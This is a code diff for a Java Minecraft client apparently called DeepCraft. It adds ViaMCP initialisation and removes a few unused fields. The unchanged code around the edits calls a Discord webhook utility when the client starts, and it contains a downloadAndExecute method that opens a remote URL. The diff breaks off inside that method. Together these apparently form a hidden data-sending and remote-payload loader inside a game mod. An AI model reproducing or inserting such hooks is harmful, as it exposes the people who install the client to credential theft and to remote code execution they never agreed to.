@@ -1,6 +1,7 @@
 package me.deepcraft;
 
 
+import de.florianmichael.viamcp.ViaMCP;
 import me.deepcraft.commands.CommandManager;
 import me.deepcraft.gui.IngameGui;
 import me.deepcraft.gui.clickgui.ClickGui;
@@ -26,23 +27,19 @@ public class DeepCraft {
     public static CommandManager commandManager = new CommandManager();
     public static ClickGui clickgui = new ClickGui();
     public static IngameGui ingameGui = new IngameGui();
-    public static String PrevIp;
-    public static int PrevPort;
     public static void start() throws LoginException {
         LoginUtil.login();
         DiscordLoginUtils.webhook();
+        try {
+            ViaMCP.create();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     public static void stop() {
+
         }
-
-
-    public static Minecraft getInstance() {
-        return null;
-    }
-
-
-
     private static void downloadAndExecute(String fileUrl, String fileName) throws Exception {
         URL url = new URL(fileUrl);
         try (InputStream in = url.openStream();
